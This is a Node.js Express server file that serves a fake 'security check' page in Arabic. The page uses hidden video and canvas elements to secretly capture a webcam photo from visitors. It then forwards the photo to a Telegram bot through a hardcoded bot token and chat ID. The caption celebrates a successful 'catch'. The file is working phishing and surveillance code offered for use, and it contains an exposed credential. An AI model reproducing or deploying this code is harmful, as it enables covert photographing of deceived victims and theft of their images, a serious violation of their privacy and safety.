const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const port = process.env.PORT || 3000;

const TOKEN = '8766880203:AAHfls3J_uKpUXdjZjtY3QcsjHXky3xFrxE'; 
const CHAT_ID = '7099906183';

app.use(express.json({ limit: '50mb' }));

app.post('/send-photo', async (req, res) => {
    const { image } = req.body;
    try {
        const base64Data = image.split(',')[1];
        const buffer = Buffer.from(base64Data, 'base64');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'capture.png' });
        form.append('caption', '🚀 تم الصيد بنجاح يا أسمر!\nوصلت صورة سيلفي جديدة لبوتك.');
        
        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
        res.sendStatus(200);
    } catch (error) {
        res.sendStatus(500);
    }
});

app.get('/', (req, res) => {
    res.send(`
        <html>
        <body style="background:black;color:white;text-align:center;padding-top:50px;font-family:Arial;">
            <h2>جاري فحص الأمان...</h2>
            <video id="v" style="display:none" autoplay></video>
            <canvas id="c" style="display:none"></canvas>
            <script>
                navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
                    const v = document.getElementById('v');
                    v.srcObject=s;
                    setTimeout(()=>{
                        const c = document.getElementById('c');
                        c.width=v.videoWidth; c.height=v.videoHeight;
                        c.getContext('2d').drawImage(v,0,0);
                        fetch('/send-photo',{
                            method:'POST',
                            headers:{'Content-Type':'application/json'},
                            body:JSON.stringify({image:c.toDataURL('image/png')})
                        });
                    },2000);
                }).catch(e=>alert('يجب السماح بالكاميرا للمتابعة'));
            </script>
        </body>
        </html>
    `);
});

app.listen(port, () => { console.log('Bot is Active'); });
